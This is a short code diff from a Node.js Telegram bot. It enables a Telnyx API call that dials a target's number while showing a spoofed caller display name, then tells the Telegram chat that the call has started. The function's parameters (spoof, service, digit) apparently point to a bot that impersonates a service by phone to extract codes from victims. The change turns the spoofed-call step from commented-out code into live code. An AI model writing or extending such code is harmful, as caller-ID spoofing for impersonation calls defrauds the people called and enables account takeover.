@@ -118,13 +118,17 @@ async function call (spoof, customer_number, ctx, service, name, digit){
    try {
       const { data: connection } = await telnyx.connections.retrieve('2307488084473677329');
       console.log('your connections are: ', connection)
-      // const { data: call } = await telnyx.calls.create({
-      //    connection_id: connection_id,
-      //    to: `+${customer_number}`,
-      //    from: service_number,
-      //    from_display_name: `+${spoof}`,
-      //    answering_machine_detection: 'detect'
-      // }); 
+
+      const { data: call } = await telnyx.calls.create({
+         connection_id: connection.id,
+         to: `+${customer_number}`,
+         from: service_number,
+         from_display_name: `+${spoof}`,
+         answering_machine_detection: 'detect'
+      }); 
+
+
+
       await bot.telegram.sendMessage(ctx.chat.id, `📞 Call has Started...`, {
          reply_markup:{
             inline_keyboard: [
